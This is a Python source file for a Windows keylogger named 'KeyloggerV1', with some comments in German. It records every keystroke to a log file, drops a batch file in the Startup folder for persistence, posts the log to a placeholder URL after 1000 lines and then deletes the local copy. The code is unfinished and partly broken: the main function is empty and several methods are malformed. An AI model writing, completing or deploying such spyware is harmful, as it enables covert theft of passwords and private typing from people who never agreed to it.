from pynput.keyboard import Key, Listener
import logging
import os
import requests
import getpass

test_check = str(input("Really want to start the keylogger? If so, type 'start'!"))
if test_check == "start":

    checker = False
    uploaded = False

    user_name = getpass.getuser()

    class KeyloggerV1():
        def __init__():
            super().__init__()

        #run file on startup:
        def startup(file_path=""):
            if file_path == "":
                file_path = os.path.dirname(os.path.realpath(__file__))
            bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % user_name, 
            with open(bat_path + '\\' + "open.bat", "w+") as bat_file:
                bat_file.write(r'start "" "%s"' % file_path)

        def keylogger():

            #Datei erstellen + Timestamps Format
            logging.basicConfig(filename=("keylog.txt"), level =logging.DEBUG, format=" %(asctime)s - %(message)s")

            #Defining function
            def on_press(key):
                #with enter/space a new line shall be created, rest should be in one line 
                if key == Key.enter or key == Key.space:
                    pass

                logging.info(str(key))

            #Tastenschläge erfassen
            with Listener(on_press=on_press) as listener:
                listener.join()


        #condition when .txt should be uploaded, >1000 lines 
        def upload_condition(self):
            log = "keylog.txt"
            
            open_txt = open(log, "r")
            read_txt = open_txt.read()

            log_list = read_txt.split("\n")

            if len(log_list) >= 1000:
                self.checker = True

        def upload(self):
            if checker: 
                with open('keylog.txt', 'rb') as f:
                    self.r = requests.post('url', files={'keylog.txt':f})
                    self.uploaded = True

        def delete():
            if uploaded:
                file = "keylog.txt"
                location = 'TBA'
                path = os.path.join(location, file)

                os.remove(path)
        # os.remove(file)

    victim = KeyloggerV1()
    def main():
        pass


    main()
print("not started")